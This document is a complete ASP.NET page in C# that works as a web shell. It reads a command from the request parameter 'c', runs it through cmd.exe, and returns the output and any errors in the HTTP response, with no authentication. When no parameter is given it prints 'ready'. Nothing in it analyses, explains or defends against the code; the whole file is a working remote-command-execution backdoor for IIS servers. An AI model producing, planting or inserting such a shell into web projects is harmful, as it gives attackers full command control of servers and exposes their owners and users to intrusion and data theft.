<%@ Page Language="C#" AutoEventWireup="true" %>
<%@ Import Namespace="System.Diagnostics" %>
<script runat="server">
protected void Page_Load(object sender, EventArgs e)
{
    string cmd = Request["c"];
    if (string.IsNullOrEmpty(cmd))
    {
        Response.Write("ready");
        return;
    }

    try
    {
        ProcessStartInfo psi = new ProcessStartInfo();
        psi.FileName = "cmd.exe";
        psi.Arguments = "/c " + cmd;
        psi.RedirectStandardOutput = true;
        psi.RedirectStandardError = true;
        psi.UseShellExecute = false;
        psi.CreateNoWindow = true;

        Process p = Process.Start(psi);
        string output = p.StandardOutput.ReadToEnd();
        output += p.StandardError.ReadToEnd();
        p.WaitForExit();

        Response.Write(output);
    }
    catch (Exception ex)
    {
        Response.Write("Error: " + ex.Message);
    }
}
</script>
